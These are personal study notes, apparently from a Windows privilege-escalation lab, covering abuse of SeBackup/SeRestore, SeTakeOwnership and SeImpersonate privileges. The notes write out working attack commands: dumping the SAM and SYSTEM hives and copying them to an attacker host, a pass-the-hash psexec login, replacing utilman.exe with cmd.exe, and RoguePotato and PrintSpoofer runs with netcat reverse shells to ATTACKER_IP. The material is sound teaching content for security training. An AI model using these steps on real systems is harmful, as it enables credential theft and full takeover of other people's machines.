<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abusing Dangerous Privileges</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Abusing Dangerous Privileges</h1><br/><strong><h1>Abusing Dangerous Privileges</h1></strong><br /><br /><strong><h2>Windows Privileges</h2></strong><br /><br />Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.<br /><br />Each user has a set of assigned privileges that can be checked with the following command:<br /><br /><strong>whoami /priv</strong><br /><br />A complete list of available privileges on Windows systems is available here. From an attacker&#39;s standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.<br /><br />While we won&#39;t take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.<br /><br /><br /><strong><h2>A) SeBackup / SeRestore</h2></strong><br /><br />The <strong>SeBackup</strong> and <strong>SeRestore</strong> privileges allow users to <strong>read and write </strong>to <strong>any file</strong> in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.<br /><br />Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the <strong>SAM</strong> and <strong>SYSTEM</strong> registry hives to extract the local Administrator&#39;s password hash.<br /><br />Log in to the target machine via RDP using the following credentials:<br /><br />User: THMBackup<br />Password: CopyMaster555<br /><br />This account is part of the &quot;<strong>Backup Operators</strong>&quot; group, which by default is granted the <strong>SeBackup</strong> and <strong>SeRestore</strong> privileges. We will need to open a command prompt using the &quot;<strong>Open as administrator</strong>&quot; option to use these privileges. We will be asked to input our password again to get an elevated console:<br /><br />Run as admin<br /><br />Once on the command prompt, we can check our privileges with the following command:<br />Command Prompt<br /><br /><strong>C:\&gt; whoami /priv</strong><br /><br />PRIVILEGES INFORMATION<br />----------------------<br /><br />Privilege Name                								Description                    			State<br />============================= ======================================<br />SeBackupPrivilege             				Back up files and directories  			Disabled<br />SeRestorePrivilege            				Restore files and directories  			Disabled<br />SeShutdownPrivilege           			Shut down the system           			Disabled<br />SeChangeNotifyPrivilege       		Bypass traverse checking       			Enabled<br />SeIncreaseWorkingSetPrivilege 	Increase a process working set 		Disabled<br /><br />        <br /><br />To backup the SAM and SYSTEM hashes, we can use the following commands:<br /><br /><em>Command Prompt</em><br /><strong>C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive</strong><br />The operation completed successfully.<br /><br /><strong>C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive</strong><br />The operation completed successfully.<br /><br /><br />This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use <strong>impacket&#39;s</strong> <strong>smbserver.py</strong> to start a <strong>simple SMB server</strong> with a <strong>network share</strong> in the <strong>current directory of our AttackBox</strong>:<br /><br /><em>Kali Linux</em><br /><strong>mkdir share<br />python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</strong><br />        <br /><br />This will create a share named public pointing to the <strong>share</strong> directory, which requires the <strong>username</strong> and <strong>password</strong> of our <strong>current windows session</strong>. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: <br /><br /><em>Command Prompt</em><br /><strong>C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\<br />C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\<br /></strong><br /><br />And use impacket to retrieve the users&#39; password hashes:<br /><br /><em>Kali Linux</em><br /><strong>python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</strong><br />Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br /><br />[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821<br />[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br />Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::<br />Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br /><br /><br />We can finally use the Administrator&#39;s hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:<br /><br /><em>Kali Linux</em><br /><strong>python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.153.249</strong><br />Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br /><br />[*] Requesting shares on 10.10.175.90.....<br />[*] Found writable share ADMIN$<br />[*] Uploading file nfhtabqO.exe<br />[*] Opening SVCManager on 10.10.175.90.....<br />[*] Creating service RoLE on 10.10.175.90.....<br />[*] Starting service RoLE.....<br />[!] Press help for extra shell commands<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt; whoami<br />nt authority\system<br />        <br /><br /><strong><h2>B) SeTakeOwnership</h2></strong><br /><br />The <strong>SeTakeOwnership</strong> privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as <strong>SYSTEM</strong> and take ownership of the service&#39;s executable. For this task, we will be taking a different route, however.<br /><br />Log in to the target machine via RDP using the following credentials:<br /><br />User: THMTakeOwnership<br />Password: TheWorldIsMine2022<br /><br />To get the <strong>SeTakeOwnership</strong> privilege, we need to open a command prompt using the &quot;<strong>Open as administrator</strong>&quot; option. We will be asked to input our password to get an elevated console:<br /><br />Run as admin<br /><br />Once on the command prompt, we can check our privileges with the following command:<br />Command Prompt<br /><br />C:\&gt; whoami /priv<br /><br />PRIVILEGES INFORMATION<br />----------------------<br /><br />Privilege Name                												Description                              							State<br />============================= ================================================<br />SeTakeOwnershipPrivilege      						Take ownership of files or other objects 							Disabled<br />SeChangeNotifyPrivilege       						Bypass traverse checking                 									Enabled<br />SeIncreaseWorkingSetPrivilege 					Increase a process working set           								Disabled       <br /><br />We&#39;ll abuse <strong>utilman.exe</strong> to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:<br /><br /><em>utilman normal behaviour</em><br /><img src="images/213-1.png" alt="images/213-1.png" /><br /><br /><br />Since Utilman is run with <strong>SYSTEM</strong> privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.<br /><br />To replace utilman, we will start by taking ownership of it with the following command:<br /><br /><em>Command Prompt</em><br /><strong>C:\&gt; takeown /f C:\Windows\System32\Utilman.exe</strong><br />SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.<br /><br />        <br /><strong>Notice</strong> that being the owner of a file doesn&#39;t necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:<br /><br /><em>Command Prompt</em><br /><strong>C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</strong><br />processed file: Utilman.exe<br />Successfully processed 1 files; Failed processing 0 files<br /><br />After this, we will replace <strong>utilman.exe</strong> with a copy of <strong>cmd.exe</strong>:<br /><br /><em>Command Prompt</em><br /><strong>C:\Windows\System32\&gt; copy cmd.exe utilman.exe</strong><br />        1 file(s) copied.<br /><br />        <br />To trigger utilman, we will lock our screen from the start button:<br /><br /><img src="images/213-2.png" alt="images/213-2.png" /><br /><br />And finally, proceed to click on the &quot;<strong>Ease of Access</strong>&quot; button, which runs <strong>utilman.exe</strong> with <strong>SYSTEM</strong> privileges. Since we replaced it with a <strong>cmd.exe</strong> copy, we will get a command prompt with <strong>SYSTEM</strong> privileges:<br /><br /><img src="images/213-3.png" alt="images/213-3.png" /><br /><br /><br /><strong><h2>C) SeImpersonate / SeAssignPrimaryToken</h2></strong><br /><br /><strong><h3>I - Rogue Potato</h3></strong><br /><strong><h3>II - Juicy Potato</h3></strong><br /><strong><h3>III - PrintSpoofer</h3></strong><br /><br /><strong><h4>I - Rogue Potato</h4></strong><br />These privileges allow for a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process under the security context of another user. This is used by services that need to allow different users to access various resources, allowing the server to provide access restricted to a user&#39;s permissions easily.<br /><br />Impersonation is easily understood when you think about how an FTP server works. The FTP server needs to restrict each user to only access the files they are allowed to see. While the FTP server could implement its own access lists, it is easier to enable the server to impersonate each user, delegating access control to the operating system itself. When a user logs in to the FTP server, the server spawns a new process impersonating the connecting user. Such a process will inherit an access token with all of the privileges of the connecting user.<br /><br />As attackers, if we take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.<br /><br />In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges enabled. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if needed by the service. Internet Information Services (IIS) will also create a similar default account called &quot;iis apppool\defaultapppool&quot; for web applications.<br /><br />To elevate privileges using such accounts, an attacker needs the following:<br /><br />    ▸	To be able to spawn a process so that users can connect and authenticate to it for impersonation to occur<br />    ▸	Find a way to force privileged users to connect and authenticate to the spawned malicious process.<br /><br />We will be using the <strong>RoguePotato</strong> exploit for this exercise to accomplish both conditions. You will find other &quot;<strong>potato</strong>&quot; exploits meant for different specific Windows versions but use the <strong>same underlying principles</strong> (and different methods) to achieve privilege escalation.<br /><br />Let&#39;s start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:<br /><br /><strong>http://10.10.175.222/</strong><br /><br />We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:<br /><br /><img src="images/213-4.png" alt="images/213-4.png" /><br /><br />To use <strong>RoguePotato</strong>, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.<br /><br />While we won&#39;t explain the exploit in detail, we do need to understand a few things to run it:<br /><br />    The exploit will force the victim machine to try and instantiate an object through DCOM against the attacker&#39;s machine. To know how to connect to that specific object, the client machine will perform a process known as Object eXporter IDentifier (OXID) resolution. Simpy put, OXID resolution is the process in which a client machine sends the OXID they want to connect to, and receives instructions from the server on how to actually contact the object in question, which in this case is achieved through a named pipe. OXID resolution occurs through port 135/TCP.<br />    The OXID resolver (controlled by the attacker) will spoof a response to force a connection against a non-existent named pipe that the exploit itself will register in the target system. The named pipe will require authentication, which will then be used to impersonate the connecting user.<br />    Port 135 is used in any default Windows installation, making it impossible to bind the fake OXID resolver on the same target machine. To overcome this, the exploit will connect back to the attacker machine, which will need to redirect the OXID resolution query back to the target machine on a different port than 135. This can be easily done using socat.<br /><br />With this in mind, let&#39;s start by setting up socat to forward any connection on port 135 of the attacker&#39;s machine back to the victim on an arbitrary port, say 9999:<br /><br /><em>Kali Linux</em><br /><strong>sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.175.222:9999</strong><br /><br />We&#39;ll start a netcat listener to receive a reverse shell on our attacker&#39;s machine:<br /><br /><em>Kali Linux</em><br />nc -lvp 7777<br /><br />        And finally, use our <strong>web shell</strong> to trigger the <strong>RoguePotato</strong> exploit using the following command:<br /><br /><strong>c:\tools\roguepotato\RoguePotato.exe -r ATTACKER_IP -e &quot;C:\tools\nc64 -e cmd.exe ATTACKER_IP ATTACKER_PORT&quot; -l 9999</strong><br /><br />The -l parameter specifies the port on the victim machine where the OXID resolver will listen, which in this case is port 9999. The -r parameter indicates the remote OXID resolver address and points to our attacker machine, which will forward the connection through socat and back to the victim on port 9999. The -e parameter allows us to specify the payload to be run by the exploit, in this case, a netcat reverse shell.<br /><br />If all was correctly set up, you should expect a shell with SYSTEM privileges:<br /><br /><em>Kali Linux</em><br />nc -lvp 7777<br />Listening on 0.0.0.0 4448<br />Connection received on 10.10.175.90 49755<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation. All rights reserved.<br /><br />c:\windows\system32\inetsrv&gt;whoami<br />nt authority\system<br /><br /><strong><h3>Another Example:</h3></strong><br /><br /><br />Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:<br /><br /><strong>sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.255.20:9999</strong><br /><br />Start a listener on Kali. <strong>Simulate</strong> getting a <strong>service account shell</strong> by logging into <strong>RDP</strong> as the <strong>admin</strong> user, starting an elevated command prompt (right-click -&gt; run as administrator) and using <strong>PSExec64.exe</strong> to trigger the <strong>reverse.exe</strong> executable you created with the permissions of the &quot;<strong>local service</strong>&quot; account:<br /><br /><strong>C:\PrivEsc\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\PrivEsc\reverse.exe</strong><br /><strong>Note:</strong> The “<strong>local service</strong>” account has <strong>SeImpersonate</strong> / <strong>SeAssignPrimaryToken</strong> active as we can see below in <strong>Listner-1</strong>.<br /><br />Start <strong>another listener</strong> on Kali.<br /><br />Now, in the &quot;<strong>local service</strong>&quot; reverse <strong>shell</strong> you triggered, run the <strong>RoguePotato</strong> exploit to trigger a second reverse shell running with <strong>SYSTEM</strong> privileges (update the IP address with your Kali IP accordingly):<br /><br /><strong>C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e &quot;C:\PrivEsc\reverse.exe&quot; -l 9999</strong><br /><br /><strong><span style="text-decoration:underline;">Listener-1:</span></strong><br /><img src="images/213-5.png" alt="images/213-5.png" /><br /><br /><strong><span style="text-decoration:underline;">Listener-2:</span></strong><br /><img src="images/213-6.png" alt="images/213-6.png" /><br /><br /><br /><strong><h4>III - PrintSpoofer</h4></strong><br /><br />Here, unlike <strong>Rogue Potato</strong> we <strong>do not</strong> need an <strong>additional server</strong> for the exploit to work.<br /><br />Start a listener on Kali. <strong>Simulate</strong> getting a <strong>service account shell</strong> by logging into <strong>RDP</strong> as the <strong>admin</strong> user, starting an elevated command prompt (right-click -&gt; run as administrator) and using <strong>PSExec64.exe</strong> to trigger the <strong>reverse.exe</strong> executable you created with the permissions of the &quot;<strong>local service</strong>&quot; account:<br /><br /><strong>C:\PrivEsc\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\PrivEsc\reverse.exe</strong><br /><strong>Note:</strong> The “<strong>local service</strong>” account has <strong>SeImpersonate</strong> / <strong>SeAssignPrimaryToken</strong> active as we can see above in <strong>Listner-1</strong>.<br /><br />Start <strong>another listener</strong> on Kali.<br /><br />Now, in the &quot;<strong>local service</strong>&quot; reverse <strong>shell</strong> you triggered, run the <strong>PrintSpoofer</strong> exploit to trigger a second reverse shell running with <strong>SYSTEM</strong> privileges (update the IP address with your Kali IP accordingly):<br /><br /><strong>C:\PrivEsc\PrintSpoofer.exe -c &quot;C:\PrivEsc\reverse.exe&quot; -i</strong><br /><br /><strong><span style="text-decoration:underline;">Listener-3</span></strong><br /><img src="images/213-7.png" alt="images/213-7.png" /><br /><br /><strong><h2>END</h2></strong></div>
</body>
</html>
